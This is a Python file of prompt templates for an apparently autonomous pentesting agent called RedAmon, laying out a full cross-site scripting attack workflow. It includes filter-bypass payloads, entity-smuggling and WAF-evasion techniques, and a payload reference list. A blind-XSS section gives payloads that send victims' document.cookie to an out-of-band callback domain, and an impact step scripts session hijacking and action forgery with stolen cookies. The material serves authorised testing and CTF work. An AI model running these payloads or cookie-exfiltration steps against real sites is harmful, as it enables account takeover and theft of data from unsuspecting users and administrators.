"""
RedAmon Cross-Site Scripting (XSS) Prompts

Prompts for XSS attack workflows covering reflected, stored, DOM-based, and blind XSS.
Uses Playwright for DOM-sink detection and dialog-based proof, dalfox for WAF evasion,
kxss for per-character filter probing, and interactsh-client for blind callbacks.
"""


# =============================================================================
# XSS MAIN WORKFLOW
# =============================================================================

XSS_TOOLS = """
## ATTACK SKILL: CROSS-SITE SCRIPTING (XSS)

**CRITICAL: This attack skill has been CLASSIFIED as Cross-Site Scripting.**
**You MUST follow the XSS workflow below. Do NOT switch to other attack methods.**

---

## STOP — read these 4 checks BEFORE you build or theorize about any payload

These are the failures that most often waste a whole session. Re-read them every time
you form a hypothesis about the target.

**FIRST decide which oracle you have — it changes everything below.** Only SOME targets score
your payload with a server-side headless bot / "submit-solution" judge (a *grader*). On ordinary
reflected / stored / DOM XSS there is NO grader: **your own Playwright `page.on("dialog")`
capture IS the definitive proof** — trust it and `complete`, do not invent a grader to satisfy.
The grader-specific rules below (checks 2-4, the abandonment gate, "trust the grader") apply ONLY
once you have positively observed a scoring bot; do not apply grader logic to a plain reflection.

1. **LOCATE, don't theorize.** State WHERE your marker literally lands in the RAW response
   (HTML body / quoted attribute `value="…"` / unquoted attribute / inside `<script>` /
   URL / CSS). That physical position decides the payload — nothing else does.
   **NEVER conclude "the server evaluates my input as JavaScript / server-side eval /
   an interpreter / a `window.name` setter" from an ERROR MESSAGE.** A grader error
   (a TypeError, "you did X instead of Y", any status text) is YOUR injected JS running
   inside the grader's headless browser, or an incidental part of your payload throwing —
   it is NOT evidence of a server-side code sink. Read position, not error text. If you
   catch yourself inventing a server-side interpreter from an error string, STOP and go
   re-read the raw reflection.

2. **A headless grader does not click, hover, or type — your handler must SELF-FIRE on load.**
   Pick an event that triggers with no user interaction: `autofocus`+`onfocus`,
   `<img onerror=…>` with a genuinely broken `src`, `<svg onload=…>`, `<details open ontoggle=…>`.
   If your input lands in a quoted attribute and tag vectors (`<script>`, `<img>`) are
   stripped, break OUT of the quote (`"`) and add `autofocus onfocus=…` on the existing
   element rather than trying to inject a new tag.

3. **If the exact string the grader checks for is itself filtered, construct it WITHOUT the
   filtered literal.** e.g. if quoted `"XSS"` is stripped, produce the string via a backtick
   template `` `XSS` ``, `String.fromCharCode(...)`, or `/XSS/.source`. Solve the three
   requirements — (a) break out into the right context, (b) a self-firing event, (c) build the
   required value under the filter — SEPARATELY, then combine into one payload.

4. **A result that stays CONSTANT while your payloads VARY is caused by something ALL of them
   SHARE — it is NOT proof the target is broken.** If many structurally different payloads
   return the byte-identical verdict or error, the invariant is your common factor: your
   bypass primitive, a whitespace/separator choice, an encoding layer, your quoting, or one
   fixed event handler — not the grader. Isolate it: hold everything else constant and change
   ONLY the shared component, one at a time. A target that still returns OTHER, DIFFERENT
   messages to other inputs (a filter notice here, a "try again" there, an error elsewhere) is
   ALIVE and discriminating — a genuinely broken grader cannot tell your inputs apart. NEVER
   abandon the vulnerability class, and NEVER pivot to a different one, on the strength of a
   constant error until you have varied every shared component of your own payloads and the
   constant still holds.

Decompose. One failed combined payload does not mean the class is wrong; it usually means one
of the three sub-parts (a/b/c) is off. Vary that sub-part, not your whole theory.

**ABANDONMENT GATE — you may NOT declare the injection class dead, the grader "broken", or your
input "evaluated server-side / by an interpreter", until ALL THREE of these are on record in your
trace:**
1. the LITERAL reflection position, quoted from the RAW response body (never inferred from an
   error message or status text);
2. the EXHAUSTIVE single-character starter sweep complete — every `a-z` and `A-Z` individually
   tested after `<`, with the survivor set written down (Step 3c.0). "A few samples rejected" is
   NOT this;
3. each surviving starter carried through to the grader as a custom element with a self-firing
   handler (Step 6), and still failing.
Until all three are done, the ONLY correct action is to CONTINUE inside the class — never pivot
class, never conclude the target is broken, never invent a server-side interpreter. A constant
error while these are incomplete is evidence about YOUR shared payload components, not about the
target (check 4). Skipping any of the three means you have tested a few FORMS of the class, not
the class.

---

## PRE-CONFIGURED SETTINGS (from project settings)

```
dalfox automated WAF evasion: {xss_dalfox_enabled}
Blind XSS callbacks (interactsh): {xss_blind_callback_enabled}
CSP bypass guidance:           {xss_csp_bypass_enabled}
```

**Canary string (use this, NOT random text):** `rEdAm0n1337XsS`
- Mixed-case, contains digits, no special chars -- survives most filters intact
- Easy to grep for in responses without false positives

**Hard rules:**
- NEVER use raw `alert()` text alone as proof. The agent MUST capture it via Playwright `page.on("dialog", ...)` so the trace contains evidence.
- NEVER spray payloads on every parameter blindly. Run the canary sweep (Step 3) and the per-char filter probe (Step 3b) FIRST -- blind spraying is noisy and gets WAFed.
- ALWAYS check for `Content-Security-Policy` response header before crafting payloads. CSP changes everything.
- TRUST THE GRADER, NOT YOUR OWN BROWSER. When a target renders/scores your payload server-side (a headless bot, a "submit solution" judge), the ONLY oracle is that target's response. If a payload fires in your local Playwright/Chromium but the target still says you failed, believe the target -- graders often run a DIFFERENT or OLDER engine (PhantomJS, legacy WebKit, HtmlUnit) that parses tags, fires events, and throws errors differently. A local render that "confirms" your payload is not proof; only the grader's positive signal is. (Conversely, when NO such grader exists — ordinary reflected/stored/DOM XSS — your own dialog capture IS the proof; do not withhold `complete` waiting for a grader that is not there.)
- READ THE FILTER FROM WHAT SURVIVES, NOT FROM ERROR TEXT. A grader message like "you triggered X" or a captured runtime error describes an OUTCOME, not the injection context. A runtime error captured as your "result" often comes from an incidental part of the payload (an attribute value, a resource URL, a quote/encoding choice), NOT from the sink -- vary those incidental parts, do not assume the sink is hooked.
- THE FLAG COMES ONLY FROM THIS TARGET'S OWN SUCCESS ORACLE, IN RESPONSE TO *YOUR* PAYLOAD. A `FLAG{{...}}` value you saw ANYWHERE ELSE is NOT a solution and must NEVER be reported as one: not from a web search, a public writeup or code repository, another challenge or a look-alike/variant of this one, a cached tool-output, or any file in your workspace. Every deployment mints its OWN flag, so a flag string from any other instance is guaranteed wrong here even when the app looks identical. If you have not made the LIVE, in-scope target emit the `FLAG{{...}}` yourself, you have NOT solved it -- keep working; do not `complete`. Treat any payload you find externally the SAME way: it is a LEAD to ADAPT through the measurement workflow (Step 3c) against THIS target's live reflection, never an answer to paste. A payload that wins on a similar-looking challenge is routinely defeated by this target's own filter (a different allowed-tag/handler set), so re-derive it from what THIS target actually reflects and what its oracle actually accepts -- do not import the sibling's answer, reconstruct your own.

---

## MANDATORY XSS WORKFLOW

### Step 1: Reuse recon (query_graph, <5s)

BEFORE rendering anything, pull what recon already discovered:

```cypher
MATCH (e:Endpoint) WHERE e.url CONTAINS '<target_host>' RETURN e.url, e.method LIMIT 50
MATCH (p:Parameter) WHERE p.endpoint CONTAINS '<target_host>' RETURN p.name, p.location, p.endpoint LIMIT 100
MATCH (b:BaseURL) WHERE b.url CONTAINS '<target_host>' RETURN b.url
MATCH (t:Technology) WHERE t.host CONTAINS '<target_host>' RETURN t.name, t.version
```

If the graph already has Endpoints/Parameters, skip discovery and jump to Step 3 with the existing parameter list. Note any frontend framework (React/Angular/Vue) -- it changes context detection and CSP bypass strategy.

**After Step 1, request `transition_phase` to exploitation before proceeding to Step 2.**

### Step 2: Surface input vectors (execute_playwright, content mode)

If recon data is sparse or missing, render the page with a real browser to enumerate inputs that curl cannot see (JS-injected forms, SPA-rendered fields):

```
execute_playwright({{
  "url": "http://TARGET/path",
  "selector": "form",
  "format": "html"
}})
```

Then enumerate:
- Every `<form action=... method=...>` and its `<input name=...>` / `<textarea name=...>` / `<select name=...>` children
- Every URL parameter in `<a href=...>` links
- Every `<iframe src=...>` (potential injection target)
- Inline JS sources: `location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage`, `localStorage`, `sessionStorage`
- Look for `data-*` attributes consumed by JS (often unsanitized)

### Step 3: Canary reflection sweep (execute_curl)

Inject the canary `rEdAm0n1337XsS` into EVERY discovered parameter (one at a time) and grep the response:

```
execute_curl({{"args": "-s 'http://TARGET/path?param1=rEdAm0n1337XsS&param2=normal'"}})
execute_curl({{"args": "-s -X POST -d 'name=rEdAm0n1337XsS&email=test@x.com' http://TARGET/submit"}})
execute_curl({{"args": "-s -H 'User-Agent: rEdAm0n1337XsS' http://TARGET/path"}})
execute_curl({{"args": "-s -H 'Referer: http://x/?rEdAm0n1337XsS' http://TARGET/path"}})
execute_curl({{"args": "-s -b 'tracking=rEdAm0n1337XsS' http://TARGET/path"}})
```

For each reflected canary, **inspect the 30 chars before and after** it in the response to determine context:
- Surrounded by HTML tags / text content -> **HTML body context**
- Inside `attr="..."` or `attr='...'` -> **HTML attribute context (quoted)**
- Inside `attr=...` (no quotes) -> **HTML attribute context (unquoted)**
- Inside `<script>...var x = "..."...</script>` -> **JavaScript string context**
- Inside `<script>...x = ...;</script>` (no quotes around it) -> **JavaScript code context**
- Inside `<style>...</style>` or `style="..."` -> **CSS context**
- Inside `href=`, `src=`, `action=`, `formaction=` -> **URL context**
- NOT in response body but in `Location:` header -> **Header injection / open redirect**

If the canary is NOT in the response body but the page renders dynamically, repeat with `execute_playwright` (it executes JS, so client-side reflections show up).

### Step 3b: Per-char filter probe (kali_shell -> kxss)

For each parameter that reflected the canary in Step 3, run kxss to learn which dangerous chars survive unescaped:

```
kali_shell({{"command": "echo 'http://TARGET/path?param=rEdAm0n1337XsS' | kxss"}})
```

Output lists which of `< > " ' ( ) ;` make it through unfiltered for that parameter. This tells you upfront which payload class is even possible:
- All chars survive -> any payload works, pick the simplest
- Only `"` and `'` survive (no `<`/`>`) -> attribute-breakout only, no tag injection
- Only `(` and `;` survive -> JS-context payloads only, no HTML
- Nothing dangerous survives -> filter is strong, escalate to Step 7 (dalfox bypass)

**Cross-reference Step 3b output with Step 3 context** before picking a payload. Don't try `<script>` if `<` is encoded.

### Step 3c: Measurement-based structural enumeration (when tags/attrs are filtered)

**Step 3c.0 -- fingerprint the filter's ALPHABET before any wordlist sweep.** A stripped
tag tells you the filter rejected *that form*; it does not tell you the *rule*. The decisive
question is which characters the filter accepts **immediately after the injection
metacharacter** (`<`). Do NOT sample and do NOT generalize -- run the EXHAUSTIVE
single-character sweep and read the survivor set from the diff. Enumerating every starter is
~62 cheap requests in ONE wave; there is nothing to reason about, so NEVER infer the rule from
three probes:

```
for c in {{a..z}} {{A..Z}} {{0..9}} '!' '/' '?' '%' ' '; do
  curl -s "http://TARGET/path?name=<$c" | grep -q "REJECT_MARKER" && echo "$c BLOCKED" || echo "$c SURVIVES"
done
```

Replace `REJECT_MARKER` with the literal string the app shows on a rejected tag (read it once
from a known-blocked probe -- never hard-code it). Any starter NOT producing that marker is a
survivor. You MUST have every `a-z` AND `A-Z` individually on record as blocked before you are
allowed to write down "all letters blocked" -- off-by-one range blocklists (`[a-x]`, `[b-z]`,
`[c-z]`) do occur, and where they do the ONE surviving letter is the whole solution (this matters
mainly when the filter is a character range/regex; keyword/tag-name blocklists and WAF regex,
which are more common in the wild, do not behave this way). Two outcomes change everything:
- If the reject rule is a **character range / regex** rather than a keyword list, any
  *accepted* starter character followed by an **unknown/custom element name** slips through:
  the browser parses `<{{accepted}}...>` as a custom element and still honors global attributes
  (`autofocus`, `onfocus`). A standard tag-NAME wordlist can NEVER contain this form, so this
  probe MUST run before the sweep below -- otherwise you will exhaust every real tag and
  wrongly conclude "even custom tags are blocked."
- A grader error or any "blocked / invalid tag"-style message is an OUTCOME, not the rule -- read which
  literal characters survive in the RAW response, never the message text.

**Boundary-first: a RANGE is a HYPOTHESIS until you find its exact cutoff.** `<a` and `<A`
both rejecting is equally consistent with `[a-z]`, `[a-x]`, `[b-z]`, `[c-z]` and many other
rules -- interior samples cannot tell them apart. The information lives at the EDGES, so probe
the character at each END of the range you hypothesized plus its immediate neighbours just
inside and just outside it (this is exactly why the probe set above spans the alphabet's START
and END and includes non-letters). When the filter IS a character range, off-by-one boundary
bugs are a known failure mode, and the single surviving edge character is then the ONLY accepted
starter -- the one form a tag-NAME wordlist can never contain. Do not inflate "a few samples rejected" into
"the whole class is closed" without testing the boundary.

**A surviving bypass is a lead, not the finish line -- enumerate the FULL accepted set before
committing.** When one character or form passes the filter, keep probing until the accepted set
stops growing. Survivors are NOT interchangeable downstream: one may parse and fire cleanly
while another passes the filter yet mis-parses or throws inside the grader's engine. Collect
every survivor, then carry EACH through to the grader (Step 6) before ranking or discarding it.

If common tags come back stripped, DO NOT conclude from memory that "no tags are allowed" -- a stripped payload is data about the filter, not proof the class is dead. Filters routinely blocklist the *canonical* tag NAMES (script/img/svg/iframe/body) while a browser still parses obscure equivalents. Enumerate the surviving forms by MEASUREMENT against the target, not by recall and not by a local render:

Sweep a broad battery and diff which forms survive in the response. The engine already exists -- do not hand-loop it. Use `execute_ffuf` (clusterbomb = cross-product of wordlists) and match on the target's own win/reflection signal:

```
execute_ffuf({{"args": "-u http://TARGET/path -X POST -H 'Content-Type: application/x-www-form-urlencoded' -w tags.txt:TAG -w seps.txt:SEP -w attrs.txt:ATTR -d 'PARAM=<TAG SEP ATTR HANDLER=alert(1)>' -mode clusterbomb -mr '<WIN_OR_REFLECTION_REGEX>' -mc all"}})
```

Axes to enumerate (build the wordlists broad, from a standard reference, not from a guess):
- **tag names** -- the long tail, not just the top 5: legacy/aliased tags, SVG/MathML namespaced elements, mixed-case, and malformed/unclosed variants. A filter that strips every standard tag frequently lets exactly ONE obscure form through -- that survivor is your injection point.
- **attribute separators** -- when whitespace is stripped or blocked, tags collapse; try non-space separators (`/`, tab, newline, form-feed) between attributes.
- **attribute values** -- an event handler needs its trigger to fire; vary the value form (empty attribute vs `=x` vs `=1` vs a real URL) since some engines error on one form and not another.
- **handlers** -- match the handler to what the grader actually triggers (see Step 6).

Whatever the sweep proves survives-and-fires against the target is your primitive. Trust that result over any local Playwright render.

### Step 4: Context-aware payload selection

**GATE 4.0 — PROVE YOUR CARRIER SURVIVES BEFORE YOU OPTIMIZE ANYTHING INSIDE IT.** The single
most expensive XSS mistake is pouring iterations into the *contents* of a payload (which
`alert(...)` form builds the required string, which encoding, which gadget) while the outer
CARRIER — the tag name, or the attribute-breakout — is being silently stripped, so NOTHING you
try can ever fire. Before you tune any handler or JS expression, you MUST have on record, from
the RAW reflection, WHICH carrier actually survives. This is unconditional; do it on the FIRST
exploitation wave, not only "when you suspect filtering":

1. Submit a small BATTERY of distinct carriers, each carrying only an inert marker (no handler
   yet) — one request per carrier, in ONE wave. Sweep the **whole standard event-handler-bearing
   tag set** (see the HTML-body-context list and the tag-obfuscation table in the Payload
   Reference — enumerate them ALL, common and obscure, plus one unknown/custom element and one
   attribute-breakout form), never just the two or three you reach for by reflex.
2. Diff each response and write down the SURVIVOR SET: the carriers whose literal markup comes
   back intact in the raw body. A carrier that comes back missing/rewritten is dead here — do
   not build on it no matter how canonical it is.
3. You may ONLY attach a self-firing handler (Step 6) to a carrier you OBSERVED surviving in
   step 2. If your reflex carrier is not in the survivor set, DISCARD it and move to one that is
   — the surviving carrier is frequently NOT the popular one, and the whole solution is to switch
   to the survivor, not to keep decorating the reject.

**If a graded/reflected result stays CONSTANT while you vary the alert()/JS payload but you keep
the SAME tag or breakout, your stripped CARRIER is the shared invariant (check 4) — STOP varying
the JS and go re-run GATE 4.0 to find which carrier survives.** Varying the contents of a stripped
carrier is the textbook infinite-loop; the fix is always to change the carrier, never the cargo.

Pick from `XSS Payload Reference` (separate section below) using BOTH the context (Step 3) AND the surviving chars (Step 3b):

| Context | Payload class | Look up |
|---------|---------------|---------|
| HTML body | tag injection | "HTML body context" payloads |
| Attribute (quoted) | quote breakout + event handler | "Attribute context (quoted)" payloads |
| Attribute (unquoted) | space + event handler | "Attribute context (unquoted)" payloads |
| JS string | escape quote + statement injection | "JavaScript string context" payloads |
| JS code | direct expression | "JavaScript code context" payloads |
| CSS | `</style>` breakout or expression() | "CSS context" payloads |
| URL (href/src) | `javascript:` URI | "URL context" payloads |
| Unknown / multiple | polyglot | "Polyglots" payloads |

Test ONE payload at a time. Confirm it appears unescaped in the response with execute_curl, THEN move to Step 6 to verify execution in a browser.

### Step 4b: Entity-smuggle filter-blocked characters in HTML-attribute / handler sinks (MANDATORY before you conclude a handler "can't be formed")

Applies whenever Step 3 placed you in an **HTML attribute or event-handler context** (quoted or unquoted) AND Step 3b shows the input filter strips a character your JS call itself needs -- commonly `(` `)`, but equally `'` `"` `;` `+` space, or a keyword substring like `alert` / `javascript`. Do NOT spend iterations hunting an exotic paren-free / quote-free gadget, and do NOT declare the class dead, until you have ruled this out.

**Why it works:** the HTML parser **decodes character references inside an attribute value BEFORE the JavaScript engine is handed an event-handler attribute.** A metacharacter blocked in the RAW request can therefore be written as an HTML entity -- it passes the input filter as inert text, then decodes to the real character at parse time and executes. This is the single highest-yield bypass for attribute-context character filters and it is easy to miss because the blocked character never appears literally in your request.

For EACH character the filter blocks, substitute an entity form (all three decode identically; try each spelling -- a naive blocklist often catches one and not the others):

| Char | decimal | hex | named |
|------|---------|-----|-------|
| `(`  | `&#40;`  | `&#x28;` | `&lpar;` |
| `)`  | `&#41;`  | `&#x29;` | `&rpar;` |
| `'`  | `&#39;`  | `&#x27;` | `&apos;` |
| `"`  | `&#34;`  | `&#x22;` | `&quot;` |
| `;`  | `&#59;`  | `&#x3b;` | `&semi;` |
| space| `&#32;`  | `&#x20;` | `&Tab;` |

Mechanically: take the plain attribute-context payload you WOULD have used (the Step 4 "Attribute context" row), then rewrite ONLY the filter-blocked characters as entities and leave everything else literal. Example shapes -- break out of a quoted attribute, or stay inside the current tag, with a self-firing handler whose blocked chars are entity-encoded: `"><ELEMENT HANDLER=alert&#40;1&#41;>` and the no-breakout variant `..." HANDLER=alert&#40;1&#41; x="`. Choose ELEMENT / HANDLER from the self-firing set in Step 6 (onerror on a resource that genuinely fails, onfocus+autofocus, onload, ontoggle) so it runs with no interaction, and keep the un-blocked characters literal.

**Confirm by the grader/response, not by eyeballing the reflection.** Seeing `&#40;` (or your entity text) verbatim in the raw HTML is EXPECTED and does NOT mean failure -- the encoded text is what renders/decodes. Only Step 6's rendered/graded result decides whether it fired; when the local render and the grader disagree, trust the grader (per Step 6).

**Generalization test:** the same entity substitution defeats parenthesis blocks, quote blocks, semicolon blocks, and keyword blocks (`java&#115;cript:` for a stripped `javascript`) in ANY reflected/stored XSS whose sink is an HTML attribute (event handler, `style`, a decoded `data-*`) -- it is not specific to one filter or one handler. Its value does not depend on WHICH character is blocked: enumerate the blocked set from Step 3b and encode each.

### Step 5: DOM XSS via Playwright script mode

Reflected/stored XSS lives in HTTP responses. DOM XSS lives entirely in the browser -- the server never sees the payload. Use Playwright script mode to install console+dialog handlers, then navigate with a source-tainted URL.

(If you are already working the captured corpus in **proxy_brain**, the same DOM oracle is one code block away and stays host-pinned + re-captured: `b = redamon.browser(txn_id); b.goto("/page#<img src=x onerror=alert(1)>"); b.alerts()` -- a fired dialog is the proof. Read `redamon.manual("browser")`. Use standalone execute_playwright below for cross-origin proofs the host-pin forbids, or when you are not in proxy_brain.)

Build the script as a Python string and pass via `script` arg. The runtime exposes pre-initialized `browser`, `context`, `page` variables. Pattern (use the dialog-handler proof from Step 6 -- DOM XSS fires the same `alert()` events):

1. Wire `page.on("console", ...)` and `page.on("dialog", ...)` to capture firings.
2. Optionally call `page.add_init_script(JS_HOOK)` BEFORE `page.goto(...)` to monkey-patch `innerHTML` / `eval` / `document.write` on the page so every value passed to those sinks is `console.log`-ed. Build `JS_HOOK` as a regular JS string -- it is NOT subject to Python `.format()` escaping when placed inside `script`.
3. Navigate to the target with the source-tainted URL (e.g. `?q=<svg onload=alert(1)>` or `#<img src=x onerror=alert(1)>`).
4. `page.wait_for_timeout(2000)` to let JS run, then `print()` the captured events.

Sources to test (one at a time, append to URL or set programmatically):
- `location.hash`: `#<img src=x onerror=alert(1)>`
- `location.search`: `?q=<img src=x onerror=alert(1)>`
- `document.referrer`: navigate with `Referer:` header
- `window.name`: set via `window.open` from another page
- `postMessage`: send via `page.evaluate("window.postMessage('<img src=x onerror=alert(1)>', '*')")`
- `localStorage` / `sessionStorage`: pre-populate with `page.evaluate("localStorage.setItem('x', '...')")`

Sinks that execute code: `innerHTML`, `outerHTML`, `eval`, `setTimeout(string)`, `setInterval(string)`, `Function(string)`, `document.write`, `document.writeln`, `location` (assignment), `location.href`, `iframe.src` (with `javascript:`).

### Step 6: Verify execution (Playwright dialog handler)

This is the canonical XSS proof. The dialog handler captures `alert()`/`confirm()`/`prompt()` firings from the actual rendered page:

```python
script = '''
captured = []
page.on("dialog", lambda d: (captured.append({{"type": d.type, "message": d.message, "url": page.url}}), d.dismiss()))
page.goto("http://TARGET/path?param=" + "<svg onload=alert(\\\\'XSS-PROOF\\\\')>")
page.wait_for_timeout(3000)
if captured:
    print("XSS CONFIRMED:", captured)
else:
    print("No dialog fired -- payload did not execute")
'''
execute_playwright({{"script": script}})
```

If dialog fires -> XSS confirmed, capture the URL and payload as the proof artifact, move to Step 8 (impact).
If dialog does NOT fire but the payload appears in HTML source -> filter is encoding output (HTML entity encoding likely). Either pick a different context payload from `XSS_PAYLOAD_REFERENCE` or move to Step 7 (WAF bypass).

**When a server-side grader scores the payload (headless bot / "submit solution" judge):** your local Playwright dialog is a REHEARSAL, not the verdict -- the target's response is the verdict. A payload that pops in your Chromium can still fail the grader (different/older engine), and vice-versa; when they disagree, trust the grader and vary the payload against the grader (Step 3c), not against your local browser.

**Match the handler to the trigger the grader actually fires.** Headless judges fire a limited set of events -- pick a handler that will actually run in that environment:
- `onerror` -- fires only when a resource genuinely fails to load; ensure the `src`/`href` truly errors (an empty or invalid value), and note some engines throw on certain value forms (vary it per Step 3c).
- `onload` -- fires on successful element/resource load.
- `onfocus` + `autofocus` -- many grader bots explicitly dispatch focus to `[autofocus]`/`[onfocus]` elements; a reliable trigger when image/script vectors are filtered.
- `ontoggle` (`<details open>`), `onanimationstart`/`ontransitionend` (CSS-driven) -- fire without user interaction and survive some filters.

**Injection has TWO independent gates: (1) survive the filter, (2) parse-and-fire in the
grader's engine.** A payload can clear gate 1 and still fail gate 2 -- mis-parsed by a legacy
engine, or the chosen handler throws in that engine instead of firing. When a payload SURVIVES
the filter but the grader returns an error or the wrong value instead of your marker, you have
cleared gate 1: do NOT conclude the class is dead. Hold your injection point fixed and vary
gate 2 -- swap the handler family across the list above and try the alternative element forms.
Treat {{surviving injection primitives}} x {{self-firing handlers}} as a grid and sweep it; the
solution is usually one specific CELL, not a whole row or column. The grader engine is often
older/different from your local browser, so a handler that fires locally may throw there and
vice-versa -- let the grader's response, not your local render, decide which cell wins.

### Step 7: WAF / filter bypass via dalfox (when manual payloads fail)

ONLY trigger if Steps 4-6 failed (payload reflected but encoded, or blocked by WAF). Run dalfox in the background since it can take several minutes:

```
kali_shell({{"command": "dalfox url 'http://TARGET/path?param=test' --silence --waf-evasion --deep-domxss --mining-dom -o /tmp/dalfox.json --format json > /tmp/dalfox.log 2>&1 & echo $!"}})
```

Save the PID. Poll progress:

```
kali_shell({{"command": "tail -n 50 /tmp/dalfox.log"}})
kali_shell({{"command": "ps -p SAVED_PID > /dev/null && echo RUNNING || echo DONE"}})
```

When DONE, parse results:

```
kali_shell({{"command": "cat /tmp/dalfox.json | jq -r '.[] | select(.type==\\"V\\") | .data'"}})
```

Each `type=V` entry is a verified working payload from dalfox. Take one and re-verify in Playwright (Step 6) for the captured-dialog proof.

For POST data:
```
dalfox url 'http://TARGET/submit' --data 'name=test&msg=test' --method POST --silence --waf-evasion -o /tmp/dalfox.json --format json
```

For headers:
```
dalfox url 'http://TARGET/path' -H 'Cookie: session=abc' --silence --waf-evasion -o /tmp/dalfox.json --format json
```

### Step 8: Prove impact

Pick ONE based on what's available:

**Option A -- Cookie theft via blind callback** (if `xss_blind_callback_enabled` is True):
See the "OOB / Blind XSS Workflow" section. The interactsh callback receives the stolen `document.cookie` from the victim's browser.

**Option B -- Session hijack via Playwright** (works without OOB infrastructure):
```python
script = '''
# Open second browser context, inject the stolen cookie, hit an authenticated endpoint
victim_cookie = "session=ABC123"  # captured from XSS-fired payload via blind callback or test data
ctx2 = browser.new_context()
ctx2.add_cookies([{{"name": "session", "value": "ABC123", "url": "http://TARGET"}}])
page2 = ctx2.new_page()
page2.goto("http://TARGET/account")
print("Hijacked page title:", page2.title())
print("Hijacked page body:", page2.content()[:500])
'''
execute_playwright({{"script": script}})
```

**Option C -- Authenticated action forgery** (if XSS hits an authenticated user):
Demonstrate that the payload can fire a same-origin XHR/fetch that performs an action (change password, transfer funds, etc.) the attacker could not do directly.

Once impact is proven, set `action='complete'` with the captured PoC payload + execution evidence (dialog message, hijack page title, or callback log entry).

**PRE-`complete` FLAG GATE.** If the objective is to recover a `FLAG{{...}}`, you may `complete` ONLY when the LIVE, in-scope target returned that exact flag in its OWN response to a payload YOU sent this session. Point to the specific request/response in your trace. A flag value that originated anywhere else -- a search result, a public writeup, a sibling challenge, a workspace file, a prior tool-output -- is NOT admissible and reporting it is a failed run, not a solve. If you cannot cite the live target emitting it, you are not done: return to Step 3c and keep deriving against THIS target.

**EMIT THE LITERAL FLAG, NEVER A PLACEHOLDER — the run only counts if the exact string is in your answer.** Recognizing that the response "contains the flag" is NOT completing the task: you MUST copy the full literal flag value (the complete `FLAG{{...}}` with every character present) into your final answer / the required output envelope. `FLAG{{...}}`, "the flag string", "the success message with the flag", an ellipsis, or a prose description of success are all FAILURES — the grader of YOUR run reads the literal characters, not your claim that you saw them. If the winning response was large and got **offloaded/truncated** in your view (you see an `[Output offloaded: … -> tool-outputs/…]` marker or a Head/Tail excerpt instead of the full body), the flag is almost certainly in the part you did not read — do NOT complete from the excerpt. Re-extract the exact string first: `fs_grep` the flag pattern over `tool-outputs/`, or `fs_read` the offloaded file, or re-issue a minimal request that isolates just the flag (pipe the response through a grep for the `FLAG{{...}}` pattern). Only once the full literal value is in your hand do you emit it and `complete`.
"""


# =============================================================================
# OOB / BLIND XSS WORKFLOW (interactsh-client)
# =============================================================================

XSS_BLIND_WORKFLOW = """
## OOB / Blind XSS Workflow (interactsh callbacks)

**Use this when:** Stored XSS in admin panels (you cannot trigger it yourself), or when the payload context is hidden from you (server-side log viewers, internal dashboards). The payload exfiltrates `document.cookie` (or other browser data) to an attacker-controlled callback domain when an unsuspecting user (admin/moderator) views the injected content.

---

### Step 1: Start interactsh-client as a background process

```
kali_shell({"command": "interactsh-client -server oast.fun -json -v > /tmp/interactsh.log 2>&1 & echo $!"})
```

**Save the PID** for later cleanup.

### Step 2: Read the registered callback domain

```
kali_shell({"command": "sleep 5 && head -20 /tmp/interactsh.log"})
```

Look for a line containing the `.oast.fun` domain (e.g. `abc123xyz.oast.fun`).

**CRITICAL:** This domain is cryptographically registered with the server. Random strings will NOT work -- you MUST use the domain printed in the log.

> `oast.fun` is the DEFAULT public interactsh server. If the project configured a different OOB provider or a self-hosted interactsh, pass that host to `-server` instead. Blind XSS depends on the victim/grader browser having egress to that host -- if it never fires, that is INCONCLUSIVE (no egress / not viewed yet), not proof there is no blind XSS.

### Step 3: Inject blind XSS payloads pointing at the registered domain

Generic HTML body injection:
```
"><img src=x onerror="fetch('http://REGISTERED_DOMAIN/?c='+btoa(document.cookie))">
```

JavaScript string context (escape + exfiltrate):
```
';fetch('http://REGISTERED_DOMAIN/?c='+btoa(document.cookie));//
```

SVG no-quote (bypasses some filters):
```
<svg/onload=fetch(`//REGISTERED_DOMAIN?c=${document.cookie}`)>
```

DNS-only exfil (when HTTP is blocked outbound):
```
<img src=x onerror="new Image().src='//'+btoa(document.cookie).slice(0,50)+'.REGISTERED_DOMAIN'">
```

dalfox blind mode (auto-tests many payloads with the callback):
```
kali_shell({"command": "dalfox url 'http://TARGET/path?param=test' -b REGISTERED_DOMAIN --silence -o /tmp/dalfox.json --format json"})
```

### Step 4: Submit payloads into stored fields

Target: comment forms, profile bio, support tickets, contact-us forms, error log viewers, search history, anywhere the payload will be RENDERED LATER by another user (typically an admin or moderator).

Submit via execute_curl or Playwright (multipart/form data). Then wait. Blind XSS may take minutes to hours to fire depending on how often the admin views the page.

### Step 5: Poll for callbacks

```
kali_shell({"command": "tail -50 /tmp/interactsh.log"})
```

Look for JSON lines with:
- `"protocol":"http"` -- the cookie is in the URL query string (decode with `base64 -d` if you used `btoa`)
- `"protocol":"dns"` -- DNS-only exfil; the data is in the subdomain prefix
- `"remote-address"` -- the IP of the victim browser (often an internal admin host)

### Step 6: Cleanup

```
kali_shell({"command": "kill SAVED_PID"})
kali_shell({"command": "rm /tmp/interactsh.log /tmp/dalfox.json /tmp/dalfox.log 2>/dev/null"})
```
"""


# =============================================================================
# XSS PAYLOAD REFERENCE
# =============================================================================

XSS_PAYLOAD_REFERENCE = """
## XSS Payload Reference

Look up payloads by the context detected in Step 3 of the main workflow. Always test the simplest payload first; only escalate complexity if the simple one is filtered.

### HTML body context
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
<input autofocus onfocus=alert(1)>
<xyz autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
```

### Attribute context (quoted with " or ')
Break out of the quote, then inject an event handler:
```
" onfocus=alert(1) autofocus="
' onmouseover=alert(1) x='
"><img src=x onerror=alert(1)>
'><svg onload=alert(1)>
" autofocus onfocus=alert(1) "
```
If the filter strips a character these payloads need (`(` `)` `'` `;`, or a keyword like `alert`), do NOT abandon the attribute vector -- entity-encode ONLY the blocked characters and leave the rest literal (see Step 4b). Apply it to whichever self-firing form from the list above actually fires against the grader (Step 6) -- e.g. the breakout `"><svg onload=alert&#40;1&#41;>` or an in-tag `..." HANDLER=alert&#40;1&#41; autofocus x="` -- do not assume a specific element/handler; sweep the survive-and-fire grid. The parser decodes the attribute before the handler runs, so the entity passes the input filter yet executes.

